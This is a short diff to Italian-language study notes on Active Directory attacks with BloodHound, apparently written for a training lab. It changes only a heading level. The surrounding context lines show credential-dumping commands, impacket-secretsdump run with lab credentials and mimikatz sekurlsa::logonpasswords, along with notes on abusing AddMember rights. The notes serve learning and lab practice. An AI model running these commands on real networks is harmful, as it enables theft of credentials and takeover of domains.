@@ -16,7 +16,7 @@
         - [Opzione 3 – PSRemote (se abilitato)](#opzione-3--psremote-se-abilitato)
           - [Può succedere che:](#può-succedere-che)
         - [Opzione 4 – Dumping credenziali (il vero valore di AdminTo)](#opzione-4--dumping-credenziali-il-vero-valore-di-adminto)
-  - [AddMember](#addmember)
+    - [AddMember](#addmember)
     - [Differenza con AddSelf](#differenza-con-addself)
 - [SharpHound - Data Collection da Windows](#sharphound---data-collection-da-windows)
   - [Metodi di Collection](#metodi-di-collection)
@@ -221,7 +221,7 @@ impacket-secretsdump INLANEFREIGHT.HTB/sarah:Password12@SRV01
 .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
 ```
 
-## AddMember
+### AddMember
 ![alt text](images/bloodhound/AddMember.png)
 
 - AddMembers su ITManagers significa che Martha può aggiungere utenti al gruppo ITManagers.
